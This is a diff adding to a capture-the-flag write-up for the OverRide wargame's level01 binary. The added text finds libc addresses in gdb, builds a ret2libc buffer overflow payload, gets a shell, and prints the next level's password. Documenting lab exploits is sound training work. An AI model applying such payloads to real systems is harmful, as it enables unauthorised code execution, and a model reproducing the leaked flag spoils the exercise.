@@ -104,7 +104,53 @@ warning: Selected architecture i386:x86-64 is not compatible with reported targe
 Architecture of file not recognized.
 ```
 
+i will go with ret2libc
+```
+(gdb) p &system
+ 0xf7e6aed0 
+ 
+ or 
+ 
+ (gdb) info addr system
+ 0xf7e6aed0 
+ 
+(gdb) p &exit
+ 0xf7e5eb70 
+ ```
+ ```
+(gdb) find system, +9999999, "/bin/sh"
+0xf7f897ec
 
+or
 
+ (gdb) info proc map
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
+	 0xf7e2b000 0xf7e2c000     0x1000        0x0
+	 0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
 
+find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+```
 
+so
+
+payload = padding + system + return_after_system + bin_sh
+
+`payload = "A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "AAAA" + "\xf7\xf8\x97\xec"[::-1]`
+
+```
+level01@OverRide:~$ (python -c 'print "dat_will\n" + "A" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "AAAA" + "\xf7\xf8\x97\xec"[::-1]' ; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+pwd
+/home/users/level01
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
